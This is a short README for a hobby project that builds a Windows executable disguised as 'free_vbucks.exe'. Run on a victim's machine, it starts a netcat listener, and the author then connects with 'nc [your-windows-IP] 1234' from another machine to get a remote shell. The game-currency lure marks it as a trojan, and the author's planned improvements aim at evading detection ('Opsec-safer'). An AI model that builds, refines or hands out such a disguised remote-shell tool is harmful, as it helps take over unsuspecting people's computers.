Pre-requisites:
Have Python and cx_Freeze installed

How to install cx_Freeze:
run "pip install cx_Freeze" in your terminal

How it works:

1. Open your code editor (or cmd) and run "python setup.py build" in the terminal and a "Build" folder should be generated
2. Open the folder inside the "Build" folder and run "free_vbucks.exe" in your Windows system
3. Try "nc [your-windows-IP] 1234" on another machine (i.e. Kali Linux)
4. You should be able to spawn a shell on your target machine

(Its a mini POC/passion project I wanted to try)

Note: The netcat will run and listen only one time each time you run the executable. To re-enable Netcat to listen for incoming connections, simply run the executable once more.

<--- Work in Progress --->

How I plan to improve on this project further:

Making it Opsec-safer:
1. Remove the use of VBScript
2. Make my python script run Netcat on its own

<--- Work in Progress --->
